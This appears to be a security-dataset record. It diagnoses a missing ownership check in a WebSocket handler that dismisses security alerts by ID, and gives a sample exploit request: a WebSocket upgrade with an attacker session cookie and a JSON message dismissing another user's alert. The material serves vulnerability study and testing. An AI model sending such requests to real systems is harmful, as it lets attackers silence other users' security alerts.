diagnosis: The WebSocket handler marks SecurityAlert as dismissed by alert_id received over the socket. It fails to scope the database update to user=self.scope['user'], allowing any connected user to dismiss critical security alerts belonging to other users.
exploit_request:
GET /ws/alerts/ HTTP/1.1
Host: console.example.com
Upgrade: websocket
Connection: Upgrade
Cookie: sessionid=attacker_session

{"command": "dismiss_alert", "alert_id": 84102}
